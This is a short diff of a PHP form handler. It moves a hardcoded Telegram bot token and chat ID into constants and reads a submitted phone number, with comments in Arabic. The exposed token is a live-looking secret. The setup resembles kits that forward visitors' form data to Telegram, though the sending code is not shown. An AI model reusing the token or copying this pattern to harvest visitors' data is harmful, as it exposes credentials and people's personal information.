@@ -1,7 +1,7 @@
 <?php
 // Telegram Bot Configuration
-$botToken = "8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A";
-$chatId = "8053385893";
+define('BOT_TOKEN', '8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A');
+define('CHAT_ID', '8053385893');
 
 // استقبال البيانات
 $phone_number = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : 'غير متوفر';
